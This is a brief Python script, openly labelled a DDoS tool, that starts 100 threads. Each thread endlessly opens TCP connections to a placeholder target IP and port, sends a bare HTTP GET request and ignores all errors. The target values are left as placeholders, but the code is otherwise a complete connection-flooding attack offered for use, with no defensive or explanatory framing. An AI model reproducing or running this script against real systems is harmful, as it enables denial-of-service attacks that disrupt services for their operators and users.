import socket
import threading

target_ip = "target ip"
target_port = targeted_port

def ddos():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.sendto("GET / HTTP/1.1\r\n".encode('ascii'), (target_ip, target_port))
            sock.sendto("Host: {}\r\n\r\n".format(target_ip).encode('ascii'), (target_ip, target_port))
            sock.close()
        except:
            pass

for _ in range(100):
    t = threading.Thread(target=ddos)
    t.start()
